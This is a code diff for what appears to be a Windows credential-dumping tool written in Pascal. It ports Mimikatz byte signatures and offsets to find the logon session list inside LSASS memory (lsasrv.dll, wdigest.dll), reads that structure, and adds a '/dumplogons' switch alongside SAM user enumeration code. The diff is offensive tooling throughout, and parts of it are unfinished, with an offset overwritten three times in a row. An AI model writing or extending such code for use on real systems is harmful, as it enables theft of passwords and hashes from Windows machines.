@@ -14,6 +14,20 @@ type tdomainuser=record
 end;
 pdomainuser=^tdomainuser;
 
+type i_logsesslist=record
+     next:nativeuint;
+     prev:nativeuint;
+     usagecount:nativeuint;
+     this:nativeuint;
+     luid:nativeuint;
+     unk1:nativeuint;
+     unk2:nativeuint;
+     usernameptr:nativeuint;
+     minmax:nativeuint;
+     domainptr:nativeuint;
+     passwordptr:nativeuint; //??
+     end;
+
 
 
 const
@@ -88,7 +102,7 @@ DomainSID_.SubAuthority[0] :=SECURITY_BUILTIN_DOMAIN_RID;
 //domain sid=user sid minus RID
 //lets get PUSERSID
 GetAccountSid2(server,widestring(user),pusersid);
-if (pusersid<>nil) and (ConvertSidToStringSid(pusersid,stringsid)) then
+if (pusersid<>nil) and (ConvertSidToStringSidA(pusersid,stringsid)) then
    begin
    log('user:'+StringSid );
    //
@@ -112,10 +126,10 @@ if (pusersid<>nil) and (ConvertSidToStringSid(pusersid,stringsid)) then
    end;
 
 //lets get PDOMAINSID
-if  ConvertStringSidToSid(pchar(domain),PDOMAINSID ) then
+if  ConvertStringSidToSidA(pchar(domain),PDOMAINSID ) then
     begin
     //log ('ConvertStringSidToSidA:OK');
-    if ConvertSidToStringSid (PDOMAINSID ,StringSid) then
+    if ConvertSidToStringSidA (PDOMAINSID ,StringSid) then
        begin
        //log ('ConvertSidToStringSid:OK');
        //log ('domain:'+StringSid );
@@ -221,7 +235,7 @@ if Status <> 0 then
    if 1=2 then
    begin
    //getmem(StringSid ,261);
-   if ConvertSidToStringSid(PUSERSID ,stringsid) then
+   if ConvertSidToStringSidA(PUSERSID ,stringsid) then
       begin
       //showmessage(inttostr(PUSERSID^.Revision)) ;
       //showmessage(stringsid);
@@ -423,7 +437,7 @@ begin
 //could go straight to 'Builtin' or even 'S-1-5-32' or to computername ?
 //if a domain is ever passed as a parameter
 if _domain<>'' then
-   if  ConvertStringSidToSid(_domain,PDOMAINSID )=false
+   if  ConvertStringSidToSidA(_domain,PDOMAINSID )=false
    then log('ConvertStringSidToSid failed',1 )
    else log ('ConvertStringSidToSid ok',0);
 
@@ -523,7 +537,7 @@ begin
 result:=false;
 //
 GetAccountSid2(server,widestring(user),pusersid);
-if (pusersid<>nil) and (ConvertSidToStringSid(pusersid,stringsid)) then
+if (pusersid<>nil) and (ConvertSidToStringSidA(pusersid,stringsid)) then
    begin
    log('user:'+StringSid,1 );
    SplitUserSID (StringSid ,domain,rid);
@@ -546,7 +560,7 @@ if Status <> 0 then
    begin log('SamConnect failed:'+inttohex(status,8));;end
    else log ('SamConnect ok');
 //
-if  ConvertStringSidToSid(pchar(domain),PDOMAINSID )=false
+if  ConvertStringSidToSidA(pchar(domain),PDOMAINSID )=false
    then log('ConvertStringSidToSid failed' )
    else log ('ConvertStringSidToSid ok');
 //
@@ -606,7 +620,7 @@ result:=false;
 if user='' then exit;
 //
 GetAccountSid2(server,widestring(user),pusersid);
-if (pusersid<>nil) and (ConvertSidToStringSid(pusersid,stringsid)) then
+if (pusersid<>nil) and (ConvertSidToStringSidA(pusersid,stringsid)) then
    begin
    log('user:'+StringSid,1 );
    SplitUserSID (StringSid ,domain,rid);
@@ -629,7 +643,7 @@ if Status <> 0 then
    begin log('SamConnect failed:'+inttohex(status,8),status);;end
    else log ('SamConnect ok',status);
 //
-if  ConvertStringSidToSid(pchar(domain),PDOMAINSID )=false
+if  ConvertStringSidToSidA(pchar(domain),PDOMAINSID )=false
    then log('ConvertStringSidToSid failed',status )
    else log ('ConvertStringSidToSid ok',status);
 //
@@ -881,11 +895,17 @@ begin
 
 end;
 
-function dumplogons(pid:dword;user:string):boolean;
+
+//check kuhl_m_sekurlsa_utils.c
+function dumplogons(pid:dword;module:string):boolean;
 const
   WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
+  WNBLUE_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
   after:array[0..1] of byte=($eb,$04);
   //after:array[0..1] of byte=($0F,$84);
+  // Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)
+  PTRN_WIN5_PasswdSet:array [0..3] of byte=  ($48, $3b, $da, $74);
+  PTRN_WIN6_PasswdSet:array [0..3] of byte=  ($48, $3b, $d9, $74);
 var
   dummy:string;
   hprocess,hmod:thandle;
@@ -899,15 +919,24 @@ var
   read:cardinal;
   offset:nativeint=0;
   patch_pos:ShortInt=0;
-  pattern:tbytes;
+  pattern:array of byte;
+  logsesslist:array [0..sizeof(i_logsesslist)-1] of byte;
 begin
   if pid=0 then exit;
   //if user='' then exit;
   //
   if (lowercase(osarch)='amd64') then
      begin
+     setlength(pattern,sizeof(PTRN_WIN6_PasswdSet));
+     copymemory(@pattern[0],@PTRN_WIN6_PasswdSet[0],sizeof(PTRN_WIN6_PasswdSet));
      //{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}}
      patch_pos:=23;
+     //{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
+     patch_pos:=36;
+     //{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 36}},
+     //{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 48}},
+     //{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-4, 48}},
+     patch_pos:=-4;
      end;
   //x86 to do...
   if patch_pos =0 then
@@ -933,19 +962,18 @@ begin
                    begin
                     if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
                       begin
-                      dummy:=strpas(szModName );
-                      if pos('lsasrv.dll',dummy)>0 then
+                      dummy:=lowercase(strpas(szModName ));
+                      if pos(lowercase(module),dummy)>0 then
                          begin
-                         log('lsasrv.dll found:'+inttohex(hMods[count],8),0);
+                         log(module+' found:'+inttohex(hMods[count],8),0);
                          if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
                             begin
                             log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
                             log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
                             addr:=MODINFO.lpBaseOfDll;
-                            pattern:=Init_Int_User_Info ;
                             //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
                             log('Searching...',0);
-                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,WN1703_LogonSessionList);
+                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
                             log('Done!',0);
                             if offset<>0 then
                                  begin
@@ -955,9 +983,11 @@ begin
                                    begin
                                    CopyMemory(@offset_list_dword,@offset_list[0],4);
                                    log('ReadProcessMemory OK '+inttohex(offset_list_dword+4,4));
-                                   //we now should get a match with dd Lsasrv!LogonSessionList
-                                   log(inttohex(offset+offset_list_dword+4+patch_pos,sizeof(pointer)));
-
+                                   //we now should get a match with .load lsrsrv.dll then dd Lsasrv!LogonSessionList
+                                   log(inttohex(offset+offset_list_dword+4+patch_pos,sizeof(pointer)),0);
+                                   //read sesslist at position
+                                   ReadMem  (hprocess,offset+offset_list_dword+4+patch_pos,logsesslist );
+                                   log(inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).highPart,sizeof(pointer))+inttohex(LARGE_INTEGER(i_logsesslist (logsesslist ).next).LowPart ,sizeof(pointer)),0) ;
                                    end; //if readmem
                                  end;
                             {//test - lets read first 4 bytes of our module
@@ -1091,6 +1121,12 @@ begin
   //enum_samusers(samkey);
   //exit;
   //
+  p:=pos('/dumplogons',cmdline);
+  if p>0 then
+     begin
+     dumplogons (lsass_pid,'wdigest.dll');
+     exit;
+     end;
   p:=pos('/enumpriv',cmdline);
   if p>0 then
      begin
@@ -1256,7 +1292,7 @@ begin
   if p>0 then
        begin
        GetAccountSid2(widestring(server),widestring(user),mypsid);
-       ConvertSidToStringSid (mypsid,mystringsid);
+       ConvertSidToStringSidA (mypsid,mystringsid);
        log(mystringsid,1);
        exit;
        end;
